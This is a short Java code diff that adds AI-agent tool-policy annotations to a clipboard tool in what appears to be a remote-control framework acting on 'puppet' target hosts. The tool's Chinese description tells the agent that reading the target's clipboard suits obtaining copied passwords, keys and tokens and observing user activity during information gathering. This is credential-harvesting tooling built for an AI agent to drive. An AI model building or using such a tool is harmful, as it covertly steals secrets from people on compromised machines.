@@ -17,6 +17,8 @@ import java.util.Map;
  * 在 puppet 侧读取/写入/监控目标主机剪贴板内容。
  */
 @Component
+@org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.COMMAND,
+        operation = org.leo.ai.agent.AiToolOperation.WRITE)
 public class ClipboardTools {
 
     private static final Logger log = LoggerFactory.getLogger(ClipboardTools.class);
@@ -24,6 +26,8 @@ public class ClipboardTools {
     @Tool("读取 puppet 侧目标主机当前剪贴板中的文本内容。自动适配 Windows / macOS / Linux。"
             + "返回 content(文本内容)、length(字符数)、lines(行数)、empty(是否为空)。"
             + "适合获取用户复制的敏感信息（密码、密钥、令牌），或在信息收集阶段了解用户活动。")
+    @org.leo.ai.agent.AiToolPolicy(kind = org.leo.ai.agent.AiToolKind.QUERY,
+            operation = org.leo.ai.agent.AiToolOperation.READ_ONLY, parallelizable = true)
     public Map<String, Object> readClipboard() throws Exception {
         String sessionId = AiToolContext.requireSessionId();
         ClipboardCapable node = PuppetNodeSessionUtils.requireCapability(sessionId, ClipboardCapable.class);
